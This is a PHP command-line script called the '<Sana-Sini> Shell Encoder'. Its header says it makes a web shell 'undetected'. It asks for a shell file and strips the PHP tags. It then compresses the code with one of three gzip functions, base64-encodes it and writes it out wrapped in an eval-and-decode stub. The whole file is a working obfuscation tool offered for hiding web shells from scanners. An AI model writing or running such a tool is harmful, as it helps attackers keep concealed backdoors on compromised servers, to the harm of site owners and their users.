<?php
/**********************************************
Name: <Sana-Sini> Shell Encoder               *
Author: ./MyHeartIsyr                         *
Blog: https://myheart-isyr.blogspot.com       *
Description: Shell encoder, if you want to    *
make your shell is undetected                 *
***********************************************/
$cek = php_sapi_name() === "cli";
if(!$cek){
	exit("This encoder run in cli mode");
}

welcome();

$filename = null;
do {
	$line     = readline("[?] What your shell's name:");
	$filename = trim(str_replace(array("\n", "\r"), "", $line));
	if(strlen($filename) == 0){
		$filename = null;
	}
} while($filename == null);

$output = null;
do {
	$line   = readline("[?] Your output filename:");
	$output = trim(str_replace(array("\n", "\r"), "", $line));
	if(strlen($output) == 0){
		$output = null;
	}
} while($output == null);

print <<<LIST
List of encoder

[1] gzencode   [with base64_encode]
[2] gzdeflate  [with base64_encode]
[3] gzcompress [with base64_encode]

LIST;

$encoder = null;
do {
	$line    = readline("[?] What's your choice (just type the number):");
	$encoder = trim(str_replace(array("\n", "\r"), "", $line));
	if(!is_numeric($encoder) && !preg_match("/^([1-3]){1}$/", $encoder) && strlen($encoder) == 0){
		$encoder = null;
	}
} while($encoder == null);

$xdata = file_get_contents($filename);
$agent = str_replace(array("<?php", "<?", "?>"), "", $xdata);
if($encoder == "1"){
	$encode = base64_encode(gzencode($agent, 9));
	$encode = chunk_split($encode, 50);
	$mydata = "<?php" . "\r\n" . "eval(gzdecode(base64_decode('$encode'))); ?>";
}
elseif($encoder == "2"){
	$encode = base64_encode(gzdeflate($agent, 9));
	$encode = chunk_split($encode, 50);
	$mydata = "<?php" . "\r\n" . "eval(gzinflate(base64_decode('$encode'))); ?>";
}
elseif($encoder == "3"){
	$encode = base64_encode(gzcompress($agent, 9));
	$encode = chunk_split($encode, 50);
	$mydata = "<?php" . "\r\n" . "eval(gzuncompress(base64_decode('$encode'))); ?>";
}

if(file_put_contents($output, $mydata) == true){
	echo "[+] Done\n";
}
else {
	echo "[-] Fail\n";
}

function welcome(){
	print <<<WAKZ
///////////////////////////////////////
// <Sana-Sini> Encoder (Version 1.0) //
// By: ./MyHeartIsyr                 //
///////////////////////////////////////

WAKZ;
}